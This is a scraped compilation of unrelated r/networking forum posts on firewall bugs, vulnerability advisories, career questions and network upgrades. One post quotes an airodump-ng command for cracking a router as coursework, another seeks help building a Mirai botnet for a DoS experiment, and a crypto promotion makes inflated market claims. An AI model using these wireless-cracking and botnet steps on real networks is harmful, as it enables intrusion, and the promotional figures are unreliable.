Our ASA has four interfaces: * Inside: 10.100.1.1/24 * Outside: &lt;public IP&gt; * DMZ1: 172.100.0.1/24 * DMZ2: 172.200.0.1/24 Internet is fine, site-2-site tunnels are fine, remote access AnyConnect VPN is fine, inter-site access is fine - the only thing that doesn't work is DMZ2. Both DMZ1 and DMZ2 connect to separate, unrouted VLANs on an 24 port HP procurve: DMZ1 gets ports 1-12 and DMZ2 get 13-24. DMZ2 is fine: the forward-facing servers can be accessed by remote machines and we can manage the machines via the Inside interface. DMZ1 won't pass any traffic. The interface is up, its duplex/speed is fine, etc. By all accounts everything should be working since the config wasn't changed before the firmware update. However there's no MAC addresses in its ARP table for any of the hosts connected to its portion of the switch. I tried connecting a laptop directly to the interface and I can't ping the interface, let alone anything past it and my laptop's MAC doesn't show up on the ASA. I opened a case with TAC though I haven't worked with a tech yet. Good times. **Update 1:** The TAC tech switched the DMZ configs from gi0/2 to gi0/5. After that I was able to connect up a laptop to the DMZ switch and ping the gateway address, at this point the tech felt that the issue was resolved but I still couldn't ping the DMZ hosts from the Inside network and those DMZ hosts couldn't ping the DMZ gateway. But here's the kicker; for the sake of brevity in the original text I didn't mention that I updated two other ASAs at different locations with the same 9.4.2.6 firmware. All of those ASAs have the same DMZ configuration with a switch connected to Gi0/2. I didn't realize this at the time of my original post but all three ASAs had the exact same symptoms. As /u/medster10 said, once I rolled back to 9.4.1 everything worked. Let this be a lesson to all you youngsters just starting out; no matter how trivial or benign you think your network changes are, make a configuration backup before you do anything. If I hadn't made a backup before the TAC ""tech"" had his way with my ASA I would have spent at least another hour undoing his mess after I rolled back to my working firmware. **Update 2 - 2/15/16** I'd just like to mention that I don't actually use non-RFC 1918 compliant addresses for the DMZ networks. I was just trying to generalize the config as much as possible and in my haste I chose poorly. The TAC tech was not helpful. Once my laptop started pinging the interface on gi0/5 he basically said the issue was resolved and rushed to get me off of the phone. I protested saying that the other hosts connected via switch to that interface still weren't showing up in the ARP table on the ASA and he shifted blame to the switch, even though my laptop was connected to that switch and was showing up in the ARP table. I get it from his perspective that he doesn't have any knowledge of the configuration of that switch, etc, but I was telling him that the only thing that changed was the firmware on the ASA and he totally blew me off. Had I known at that time that my other ASAs were exhibiting the same symptoms I would have had more leverage to pursue the matter but, as it was, I had internally decided to roll back the firmware so I decided not to fight with him. I have yet to have even a single positive experience with Cisco TAC, but I digress. So at this point we're stuck on a vulnerable firmware until Cisco releases a stable patched firmware."

Google said that a number of exploitation vectors can be used to attack this vulnerability, including but not limited to ssh, sudo and curl. Remote code execution is possible, but not straightforward, Serna said. It requires bypassing the security mitigations present on the system, such as ASLR. - See more at: URL TLDR: It seems that blocking DNS resolver responses inbound to packet sizes of 1024 should help mitigate the issue until patches can be rolled out for the millions upon millions of platforms ~~(including android)~~ that seem to be effected by this bug.

123,vulnerability,networking,Where to get security advisories and/or advisories on update issues?,4,4731k7,https://www.reddit.com/r/networking/comments/4731k7/where_to_get_security_advisories_andor_advisories/,2016-02-23 08:18:55,"Hello, first time post here. As a network admin with &lt; 2 years experience, I've found I'm often going around doing my job without a great awareness of what's happening in the world-wide network landscape. For the good of my users I'd like to improve that to prevent an outage or vulnerability being exploited. I sometimes receive notifications from superiors on issues that force upgrades of software or patching. So what's the best place to get these in the first place? We are mainly a Cisco shop, however this could also branch across to system administration including Linux/Windows or various technologies like OpenSSL/glibc that are embedded across many platforms. I've also real-world encountered a couple of Windows updates that have broken an application in some fashion. A site that lists or a forum where users can post findings of these would be probably my favorite thing ever. Nothing like your system admin spending half a day figuring out which KB broke Excel network wide after 40 updates on a Wednesday morning. I searched around and landed the following: [United States Computer Emergency Readiness Team](URL [Cisco Security Advisories](URL [LinuxSecurity.com](URL Great all-in-one Linux based site if you run different distros. [Microsoft Security Advisories and Bulletins](URL [KnowBe4](URL I was subscribed here for a while to their email newsletter. They're focused on social engineering/phishing and heavy on the advertisements to sell their simulated attack services, but some useful/interesting information comes through here. I think what I'm really looking for is a forum community where network/systems admins post updates of issues/vulnerabilities going on in real-time. I'd like to be able to come in in the morning and check to see if a Windows patch was deployed that breaks things and an admin already found it, or if some network gear needs updating, without me needing to check 10+ individual vendor websites manually. Thanks for any contributions!"

Longer edition: URL URL During a recent internal code review, Juniper discovered unauthorized code in ScreenOS that could allow a knowledgeable attacker to gain administrative access to NetScreen devices and to decrypt VPN connections. . Q: What devices does this issue impact? All NetScreen devices using ScreenOS 6.2.0r15 through 6.2.0r18 and 6.3.0r12 through 6.3.0r20 are affected by these issues and require patching. We strongly recommend that all customers update their systems and apply these patched releases with the highest priority. Q: Is the SRX or any other Junos-based system affected by these issues? These vulnerabilities are specific to ScreenOS. We have no evidence that the SRX or other devices running Junos are impacted at this time. . The first issue allows unauthorized remote administrative access to the device over SSH or telnet. Exploitation of this vulnerability can lead to complete compromise of the affected system. Upon exploitation of this vulnerability, the log file would contain an entry that system had logged on followed by password authentication for a username. Note that a skilled attacker would likely remove these entries from the log file, thus effectively eliminating any reliable signature that the device had been compromised. The second issue may allow a knowledgeable attacker to decrypt encrypted VPN traffic. There is no way to detect that this vulnerability was exploited. Makes one wonder, how and who gained access to the internals of Juniper in order to implement a backdoor that seems to went unnoticed since 2012?"

I am trying to get us to PCI DSS 3.1 compliance, and need to setup internal vulnerability scanning to do so. All locations are on a MPLS and connect to the MPLS as well as the public internet via an Adtran router. At each location, there is also a Sonicwall behind each Adtran and behind the Sonicwall sits the Cardholder Data Network I am trying to scan. There are two problems 1. Each location uses the same addressing so that assets could be swapped between locations without any change to configuration 2. I can traceroute to the Sonicwall, but not to any of the assets on the Cardholder Data LAN behind the Sonicwall We have one site where the addressing is different so that we could try to reach an asset with a unique IP, but we cant seem to reach any asset behind the Sonicwall. With this many locations, sending a physical machine to each locations to do the scans quarterly would be quite expensive. One idea I had was to connect just the Cardholder Datanetwork to the MPLS and remove the Sonicwall so that we have one large private network. This would require us to change all the addressing which my company does not want to do. Any thoughts on this matter would be greatly appreciated, I am very new to all of this and have little networking experience and resources. P.S. I know having identical addressing across every site is awful, they want it to stay this way though. "

Here is a link to my last post: URL I have figured out one way to get the phones to come back. If I reset the firewall (so change a rules order - move it up or down one - or modify a rule) it usually comes back within 10 to 15 seconds. This leads me to believe that the firewall becomes disabled and lets all traffic through during this time (which seems like a really big vulnerability to me). The problem we are having is the phones (Polycom from RingCentral) are having ""URL Calling Disabled"" errors. Ive started recording when these things happen to see whether there are any patterns, but I don't have enough data to be conclusive yet. A Jr. networking associate I have worked with in the past tells me that it could be something to do with the DHCP leases becoming incomplete (basically taking too long to extend the lease when the time comes for the phones to) which causes the phones registration to fail. I'm testing this now. Since we have 1 day as the lease time, I would expect it to happen at a consistent rate for the phones but not to everyone as a whole (Jim gets problems at 4PM and Nancy get problems at 8AM but the whole office never experiences problems together). Does this sound reasonable or something plausable? I am comfortable sending an output of our firewall whenever someone would like, but I'd prefer not to publish it for the whole world. Please let me know if I should send it to you to look at. It is an EdgeRouter by Ubiquity, so its essentially an embedded Debian instance. If there are any other commands I could provide the output of to help diagnose, I would be more than happy to do so."

Hello everyone, Im hoping someone could provide some guidance. Im working the Capstone for my cybersecurity degree and it consists of solving a (security-related) problem for an organization. Im really into quantum physics and cryptography, so my topic combines those two into a project which Im sure well see a lot more of over the next decade or so. My project is to harden a small business from quantum attacks. To fit with a realistic threat model, my scenario will address a small software developer with valuable IP that a foreign nation (one with advancing quantum computers) would consider to be of high economic value. This fake company makes software for autonomous vehicles. Heres where Im stuck. Ive never worked in software company or as a developer. I'm trying to put together an imaginary firm's infrastructure so I can conduct my analysis, but my lack of experience in such a company is slowing me down. I was thinking of following a basic startup infrastructure laid out in this article [URL though it doesnt give any attention to the physical network layout at all (Im not sure how important that is either). After laying out the infrastructure, my security company will harden the network as per guidelines set out in the book Cryptography Apocalypse: Preparing for the Day When Quantum Computing Breaks Today's Crypto by Roger Grimes. That book is the foundation for my IT solution which will involve ensuring systems are crypto agile, or can switch out cryptographic modules for algorithms that are quantum-resistant. The other main protections are increasing key lengths for symmetric and hash algorithms in use. So, I just want to create a realistic network that I can modify to be protected against breaches of confidentiality, even if their data were intercepted. I was thinking of making a situation where the company moves source code and databases onto self-hosted systems and to make my improvements from there, but I dont even know how realistic this is for an autonomous car software startup. I have so many questions, but many of them will depend on what sort of feedback or direction its suggested I take. Ive started using Packet Tracer but Im not required to create the network with it all, I just like it a lot. I would certainly appreciate any insight or resources I can learn from. Once I have *something* to fix, Ill finally be able to move forward! P.S. I also found the article at [URL to be quite interesting, but it still doesnt lead to me how their IT infrastructure might be set up. Also, stay safe and I hope you all stay healthy through this tough time."

My task is basically to brute force my way into my professor's router. In the instructions, the professor gave us the MAC address of the router, which is ""XX:XX:XX:XX:XX:4F"". I ran ""airodump-ng wlan0mon --wps' to find the channel of the network and found that the BSSID was being reported as """"XX:XX:XX:XX:XX:51"" (the Xs are the same digit to that of the MAC address). I tried to establish the 4-way handshake between my environment and the SSID/router using the provided MAC address and the hadnshake was never established. It did work with the BBSID. From what I researched, BSSID and MAC address are the same thing. Am I missing something at play here, or the information that I got was wrong?"

Story of my life in nutshell: I was attempting uni (computer science), but i have not graduated, after i was doing all kind of low level job (cleaner, fork-lift driver, waiter...) then i got fed up and once a friend of mine (CCIE) suggested to start learning cisco. I did. I wanted to work in security, but first things first, need the fundamentals and i did ccna r&amp;s. After i was looking for a job, but i quit and change again and change again and now i am at about to change again and im not sure what would be the smartest move right now. First i got a network designer job in an SSC, this was too boring, no technical tasks. Standard designs, mostly worked in excel and visio. (about a year) Then i got a junior pen-tester job (lower job grade as network designer), which was very cool, but the management was trying to fight the fire in a burning building with a cup of water...it was a mess and too much headache. So less value i could extract there. Basically we were reporting stock web app issues... (9 months) Then i changed to system verification job (R&amp;D). Basically i have to support my colleagues in a data center environment. Configuring underlay network and testing (regression,sanity) switch firmware, (in security aspect as well, but that is just a very small slice), reproducing customer issues and solving them. ( Trial period will end soon) I got two offers: One is a Cyber Threat Defence Analyst, which is an real-time, eye on glass job, where we need to review SIEM alerts and escalation by end users. Escalating anomalies. The other is a network engineer. Operation and maintenance of global back bone, resolving trouble tickets, on call support (night and weekend), domain registration. I am a CCNP R&amp;S and CCNA Cyber Ops and so close to OSCP. What would you do? Stay at the data center where probably SD network will be the direction OR regular network engineering where later on i could try the ccie OR go for cyber cybersecurity, which is the closest to my heart? I am a little afriad of the cyber threat job, because probably it is just staring at various displays (which is boring AF) but if there is chance to grow and in 1-2 years doing some interesing jobs in a SOC (if there is...) then it worth the suffer...but i have to stop jumping from job to job. What would be a reasonable decision here? What would you do guys? Any advice with a bit of reasons? (31 yrs old with family)"

192,cybersecurity,networking,BandZ Network - Decentralizd Extranet Services,1,8ppb3t,https://www.reddit.com/r/networking/comments/8ppb3t/bandz_network_decentralizd_extranet_services/,2018-06-09 11:13:48,"**BANDZ: Now you know** BandZ is the blockchain for a global P2P extranet, denominating the transfer of bandwidth between the peers that exchange private internet services on its network. For our less computer\-oriented technical readers (whether you be a legal, financial, or marketing expert) I will go over a very high\-level explanation of what intranets and extranets are. Intranets and Extranets Intranets are private networks accessible only to the members of said networks. Intranets serve an organizations digital communications needs. They also provide a secure space for storing, accessing and developing electronic materials. \[1\] Extranets are intranets that allow access to authorized sets of external users as determined by the members of that intranet, without granting full access to the intranet itself. Their major use in the business world is to facilitate cooperation between different companies on joint projects, initiatives and information sharing. They also allow companies to connect with customers in a more controlled setting than the Internet. Extranets also allow multiple companies to access network services provided by another company, such as a data\-processing application developed and maintained by one company that other companies utilize on their own intranets. \[2\] In a cosmic blackhole of a nutshell, extranets make available to external users any sort of internet service that the private intranets within have set up for its business. **INTRANET** **EXTRANET** Okay, so what? I understand what an intranet and extranet are now (sort of). Why do I care? 90&amp;#37; of the new projects which have received funding, hype, and prestige over the past two years are merely applications and not protocols in of themselves (projects such as Enecuum and Hashgraph are exempt from this criticism). Furthermore, the applications themselves are not all that exciting. Many of them are legacy models looking for free money on the speculative nature of the ICO market (not blockchain) bubble we found ourselves in until March of this year. None of these new apps actually need blockchain to operate. There is no granular integral must\-have factor to these models that elevates them to the size required in order to survive the ups and downs of the fickle ICO markets. Why is BandZ different? BandZ is much, much more than a blockchain. The blockchain is not even the focus of the project, just an ingredient in a larger technical architecture which seeks to improve on the forefather of blockchains; the internet. And even despite its lack of focus on the blockchain as a central piece (ironic isnt it?), the application of consensus algorithms is still more useful, elegant, and valuable to BandZ than it would be to some airline or rental company trying to build an ERC token. BandZ wants to reinvent the digital individual as their own private intranet and reengineer the internet into a global extranet. BandZ (denominating bandwidth) will allow these user\-intranets to exchange all sorts of service with one another in a secure, cost\-effective, and quality manner. It will raise the bar for low\-level internet infrastructure. To do so is a large endeavor and thus BandZ will roll its development out in stages. Our team will begin focusing on three profitable and undervalued markets: bandwidth sharing, virtual private networks and proxy servers, and mesh networks. The Virtual Private Network Market VPNs are often associated with illegal and devious behaviors by the mass media. It is one of the worst misconceptions in technology. Companies use VPNs all the time... theyre called intranets and you cannot really be a working company in the tech sector without one. Individuals, too, can secure their communications with VPNs or circumvent internet geo\-restriction and censorship in certain countries. The application comes with risks and benefits, but so does innovation and freedom. Proxy Servers are an application of VPNs which allow users to access the different IP addresses (and internet freedoms) of the countries in which those IP domains are attributed to. By rotating groups of IP addresses, identity and traffic can be cloaked so as to be surveillance proof and difficult to analyze statistically. The worldwide VPN market is currently estimated to be $1.26 Billion USD. By 2022, it is expected to grow to $106 Billion USD \[3\]. If that growth rate sees to bullish, its probably because the current valuation of the VPN market is wrong and heavily understated. The potential for VPN growth is like a powder keg, and blockchains are the spark. Decentralization cannot add more value to any other single industry more so than to secured P2P telecommunications. The VPN internet use case is even more powerful than money and currency. The internet is a bedrock for blockchain technology, redefining the internet with VPN properties is analogous to reinforcing the foundations of the worlds blockchain temples. Decentralizing VPNs will not only make them censorship and back\-door proof, but also reduce the friction currently present to novices in accessing the technology. Mesh Networks Believe it or not, this part of our business model was designed to help Internet Service Providers (ISPs) and not to disrupt them like every other nave startup claim in the space. Mesh nets are groups of smart devices (phones, tablets, etc.) which connect to each others WiFi so that internet ranges and accessibility can be improved (cosmic nutshell, again). A lot of remote areas are not profitable enough for ISPs to develop infrastructure towards. Even now your router does not cover the entire area of your home. Finally, that beautiful concept called the Internet of Things (IoT), it does not work as superfluously as it could without greater signal ranges and lowered data costs. Without a mesh\-net the congestion of all these smart value\-added, wireless services would be unbearable. BandZ personalized bandwidth limits and packet synchronization would do much to utilize the truly global opportunity of the IoT. Bandwidth Buying, Selling, and Sharing This feature alone is one of hot picks for 2019 in the crypto\-space. I am calling it right now; *quote me*. It is also the original idea I had in that earlier mini\-novel I call this articles introduction. Where Bitcoin and Ethereum have made strides as currency via their strengths a store value, BandZ (and other, lesser protocols specifically intended for Bandwidth exchange) will make their own path to an economic revolution in currency as a medium of exchange. Bandwidth is a consumable commodity, we all know this. Your IP address is a digital asset (maybe you did not consider that second fact). One of the hallmark blockchain problems is that, even though the consensus and transaction validity are amazing, many of the physical assets and commodities which blockchains will be used to represent *do not actually live within the machines and computations that define them*. Hardware cracks, such as lies and coercion, still compromise physical assets and commodities. I know you already guessed, but here I go anyways: *bandwidth and IP addresses exist within your software and hardware!* They can be rigorously metered and optimally utilized without falling prey to the abuse of tangible manipulations. This is why the blockchain is that non\-central but integral pieces I mentioned earlier. This is why BandZ is an extranet, and not one of the strictly bandwidth\-sharing protocols which you will 100&amp;#37; see enter the market this year (please quote me; some of them are already there anyhow). What is the Value Add? **For ISPs:** Remote areas * Some places are not profitable enough to receive internet infrastructure development * These represent untapped customer basis (even in countries outside of their own national borders)  Mesh Networks help extend their customer base to untapped regions: Africa, Middle\-East, part of South America  700 Million expected in Middle East and Africa this year * Large ISP companies work in development silos * They have little\-to\-no\-incentive to create networking solutions with other ISPs * The costs of changing an ISP business model is large because of the fixed assets and distribution networks already in play  BandZ Software Development Kit (SDK) solves this by enabling ISPs to work with each others physical infrastructure through the circulation of the BandZ token Average Revenue Per User (ARU) * Tends to be flat for ISPs, they need to sell more services to increase ARU  Mesh Networks, VPNs/Proxies, and Bandwidth Markets are all new services offered by BandZ (with more deep learning and neural networks to come) Network Congestion Collapse * Generally occurs at choke points in the network where total incoming bandwidth to a node exceeds outgoing bandwidth * DSL 10\-1,000 mbit/s incoming and at most 8 mbit/s outgoing  Mesh Networks solve this P2P Traffic * Many P2P architectures have their customers only sharing their demand with the network, but not their resources * As more customers join the network fewer resources become available to serve each new user  Mesh Networks and Bandwidth sharing allow the ISPs customers to step in with their excess digital commodities and resources  The customers can profit and fill in the service gaps for the ISPs who they are signed to Security * Protecting networks from attacks and maintaining balance between supply and demand for data is becoming harder each day  VPN and Proxies solve this  Cybersecurity attacks are estimated to be worth $2 Trillion by 2019 USD \[4\] Inability to Monetize Packet Traffic * The delay that a packet experiences in each router across the network is influenced by the level of network congestion and the number of routers along the way of transmission * This isnt sustainable for service providers, especially on wireless networks where bandwidth is constrained  Mesh Networks and Bandwidth sharing allow the ISPs customers to step in with their excess digital commodities and resources  The customers can profit and fill in the service gaps for the ISPs who they are signed to Customer Churn * Customers are often fickle and leave their ISP for cheaper alternatives at the first opportunity  Customers do not like to purchase additional services from ISPs and this results in low Average Revenues per User (ARUs)  By selling BandZ with their data plans ISPS can offer the token as an additional product and ...  Provide their services to foreign customers traveling to the ISPs home country  Provide security services at no additional cost  Generate advertising revenue with sponsored WiFi channels  Create self\-sustaining payment plans for their customers to the extent that the users internet experience feels free without being unpaid for **For Individual Users:** Roaming * Access to internet is often restricted by geographic locality * Roaming fees are very expensive for people who have no other option * Buying a sim card in foreign countries is an incredibly cumbersome experience  Mesh Networks extend the users range of access  Bandwidth markets create a lower fixed cost of hardware for ISPs and therefore cheaper data services for end users  The price of services will decrease, but the amount of services consumed will flourish (benefitting ISPs as well) Security * Most internet users are not sophisticated, nor care to implement basic security features * Most internet users care about their privacy * Most users store valuable information on their mobile and desktop devices  The VPN and Proxy Services are built\-in at no extra cost  They are easy to use, literally at the click of your touch\-screen Data Plans * Most internet users have never been able to monetize their data * The cost of data plans is very high for 4G\+ devices  Bandwidth Market places in different regions will create competition which will decrease the price of data services around the world  The customers receive financial rewards for helping their ISPs with their digital commodities and assets Empty Wifi Zones * Some countries have less infrastructure distributed across their geography than others * Users are powerless and unable to utilize the internet in empty zones  Mesh Networks makes these zones available to ISPs via their customers  The customers receive financial rewards for helping their ISPs with their digital commodities and assets Costly Services * Many enterprise\-grade software services are bundled for companies so that the price per user becomes manageable * These bundled prices are not available to individual users * If the bundled price were available, it would still be too high  The global extranet of BandZ is designed to build these services into the foundations of the future internet, and to make them financially accessible via bandwidth and easy to use via UX design So, there you have it.

He's wanting to update the network to maintain a reasonably level of security as there has been a substantial increase in cybersecurity concerns within the industry (but which hasn't). Because I had opened my mouth about the fact that I am more competent than a typical person with computers, I had ended up being the 'goto' IT guy. A mistake I won't make again... But, hey, he had upped his salary offer by a great deal, so I suppose I shouldn't complain too much, right? Anyways, it's a network of 7 computers with 4 printers, mix of W7 and W8, only one printer has wireless capabilities and I had disabled that and adjusted default passwords on it when we had gotten it. No plans to expand the network within the next 5 years. The way the network is currently setup is: modem -&gt; router/firewall -&gt; managed switched + 4 computers + 3 printers (networked through the computer) -&gt; unmanaged switch + 3 computers + 1 printer (hard wire networked). We do not use wifi and have it disabled on the router. I'm wanting to prioritize updating the the firewall/router and to place the rest of the network inside of a (P)VLAN. I'm pretty decent when it comes to software, and with documentation I can figure out what I don't know, but the actual hardware options themselves aren't something that I am too familiar with. So there are two pieces of advice that I am searching for: What would be good options for the router and what else should I look into to help protect the network from intrusion?"

I always think why many networking employees are not interested much to enter into cybersecurity domain.Since, it is closely related to networking domain. Out of curious, i am asking, What you think about cybersecurity domain and its job opportunities? What makes you stop with only network security and firewalls side than to move towards infosec. We all know that already networking is facing lot of shifts. We are being advised to learn coding, make some scripts, hook up on to deployments automation, management, devops, etc. So, why don't we think differently and start learning security topics which includes most of our network protocols, VPN, as a fundamental point and to do Infosec certifications. Kindly, share your thoughts and ideas about this and i'd be glad to hear if some of you already started in this direction. Welcome all your suggestions. Thanks in Advance"

If I don't, I would lose all my Cisco Certs (CCNA R&amp;S, Wireless, Security, and CCNP). I don't work with Cisco devices anymore. For the last 3-4 years, I have been working with Juniper devices, and love it. I have a JNCIA and planning to take more Juniper certs. I used to like Cisco, but it seems like most Enterprises are switching from Cisco to Juniper, and Junos is so much better to compare to IOS. It really feels like I am just wasting time if I spend my time studying for Cisco certs. However, I plan to get an associate degree for [Cybersecurity](URL program. And according to the website, if a candidate hold CCNA, the candidate will be awarded 12 college credits. Would it worth renewing my CCNP just for college credits?"

My partner and I have decided to take advantage of the recent DDoS attacks and release of the Mirai botnet source code to attempt to construct our own (small scale) botnet, perform a DoS attack on a client, and then attempt to quantify the mitigation technique by using techniques known to us (firewall rules, etc) and some stuff that we're still learning about (Snort as an IDS/IPS, other software-based solutions). The purpose of this post is to ask for any sort of references that will help us in setting up the botnet, purely from a research and educational perspective. Both of us are also doing our senior thesis project on Virus Propogation and Security in IoT and Cyberphysical systems, so this semester project segues nicely into the material and knowledge we'll need to be successful for that as well. Any advice on mitigation techniques/best practices, and software that we can use would also be appreciated."

I've been thinking about learning networking on cisco devices for a while now. I'm an aspiring RHCE, and networking has always been my weakest skill. I understand the basics, but would like to know much more. I just had a few goals that I'd like to accomplish if possible. 1. Learn switching and routing on Cisco products (I'm guessing this will teach me everything I need to know about networking and also be a valuable job skill, please correct me if I'm wrong.) 2. Buy a reasonably priced home lab that I can practice on, bonus points if I could actually use the gear for personal use.. This might be difficult because I think switches tend to be pretty loud. 3. Eventually take the CCNA and pass it, my job will pay for the exam fee.. So why not. 4. Learn skills that will help in other avenues, whether it is Cybersecurity/Network Security or general sysadmin stuff. Thank you for your patience with a noob. What do you guys suggest? "

The K-12 school district I work for is in the market for a new content filter. Our current one isn't cutting it, so money has been set aside for a new solution. Because we are headed in the direction of 1:1 with iPads(we're 1:1 at our largest school already), we need to be able to filter off campus. Currently we have narrowed it down to either Lightspeed Systems or iboss Cybersecurity. I'm finding it hard to find references on either of these, so I thought /r/networking might have some insight. Is there a clear victor between the two of these solutions? Any other suggestions are very much appreciated as well."

I'm hoping you can provide some expert/professional insight on helping me decide on an upgrade route. I'll try to keep it relatively simple here: I guess I'm asking what would *YOU* recommend? I've been tasked with coming up with item and budgetary details for our network upgrade/revamp. Single campus (no expansion plans), roughly 350 users (staff and students), k-8 edu, all Windows workstations, AD, currently all CISCO network gear (with the exception of a small collection of Ubiquity WAPs), 50Mbps inet, Barracuda web filter, CISCO IP Phones (Callmanager &amp; Unity), no on-site exchange Cisco gear currently in use: * ASA 5510 (x1) * Catalyst 3750 (x2) * Catalyst 3750G (x2) * Catalyst 3560 PoE-48 (x13) * Cisco Catalyst 3560 PoE-24 (x6) * WLAN Controller 4402 (x1) (to be replaced with Ubiquiti devices) * Fiber runs to all closets. VLANs for each closet. I'd at least like to start with high standards - without being completely ridiculous, what would you upgrade to for a modern solution/replacement for this gear? I know a lot of the gear isn't really all that old by many standards, but our lifecycle has them set for replacement soon. I'll certainly talk to my CISCO provider and see what the current equivalent model of what we have will cost..but I wanted to be aware of alternatives anyhow. Here are my considerations: * Being a small IT dept in a private school, I need to be a jack of all trades. That means I am less likely to be able to master every complex system we have. So MANAGEABILITY is key. CISCO isn't exactly known for having a small learning curve, but that doesn't mean I'm opposed to CISCO at all. If I'm moving away from that, it'd better have a nice, clean interface instead of solely being CLI. And something that I can hand off to whoever takes over for me when I'm gone - or that I don't have to pay a ultra-high priced consultant to help with for any changes. * Reliability and dependability. This sorta goes without saying, but wanted to make it clear I'm not looking to be all-out ""cutting edge"" with unproven products. * Speed, scalability, and modern features. Our ""cybersecurity"" implementation is almost non-existent right now. FIPS, FISMA, CIPA, etc are all things that should be considered. I'd like to make sure that security considerations are made at the foundation instead of building up and then trying to tack it on at the end. Data protection, identity protection, attack and loss mitigation, recovery, etc should be address at some level anyhow (I'm aware that many of these things are a whole beast unto themselves and there may not be a ""all in one solution""). Along with the push towards cloud/SaaS solution, I need to ensure that modern mobile device technologies and bandwidth considerations are addressed. Don't get me wrong - I'm sure there are people that get paid to provide the answers to the questions I'm asking - and I'm certainly going to reach out to a few. But before I just call up a vendor and get their sales pitch, I'd like to know what ya'll think and if you have some insights on what works for you (or what you'd do in my shoes) Thanks for the help to those who take the time! *Edit - Thanks for the great replies so far! Keep 'em coming! It looks like ""UTM"" is the buzzword I was missing. Get me some of that. :) **EDIT #2 -Thanks again for the input. Looks like it's largely - Cisco, Meraki, PA, or a look into Sophos, Ruckus, or Hp. I forgot to mention that since this won't *all* be done at once, ideally the chosen solution will play nice with existing equipment as the changeover is made over the course of 1-3 years. If that's not practical, then I'd love to hear why/ :) - My thought is to start at the core and build out - with those devices being the foundation."

I have no clue if I'm asking this question right, if there's a straight answer, or if this discussion is even allowed here, but I figured I'd ask anyway. I read that Intrusion Prevention Systems can be synced with Intrusion Detection Systems so that an IPS can send alert data to an IDS. I was also reading an article on the Internet that taking control of an IPS has already been made possible. So then is it also a possibility that someone could gain control of an IPS that's linked to an IDS, alter the data it's sending to it, and then have control over that IDS as well for an attack? "

Link follows for those who are interested. URL This is how I concluded my critique of his paper: &gt;Overall, not bad. I like your central point, you just need to drive it home a bit better. &gt; &gt;Remember to speak authoritatively. Morgan Freeman once said in an interview that there is no such thing as an aspiring actor. Youre either an actor, or youre not. Just because youre a young and inexperienced actor does not mean that you dont have something brilliant to bring to the table. &gt;You want to be a sysadmin/netadmin/secadmin? This is your shit. Own it. Tell everybody whats up. &gt;They wont have any idea until its too late. I might be young, but I've run into too many smart people with some kind of confidence issue. If you're reading this, it's likely that you're well above average in the industry. You find networking fun as a hobby and do many things above and beyond (reading and enjoying others experiences included). Newsflash guys: most people don't do this. This is a highly marketable and valuable asset! Understand your strengths, understand your weaknesses. Be honest with your employers and form a relationship based in technical mastery and zero bullshit. I literally say that on my LinkedIn. You'll be happier, you'll produce a better product for your client, and most importantly you'll have a great time doing it. The most successful people here have already figured that out--it's time to make your own path. Looking forward to the conversation that will ensue as a result of this post. "
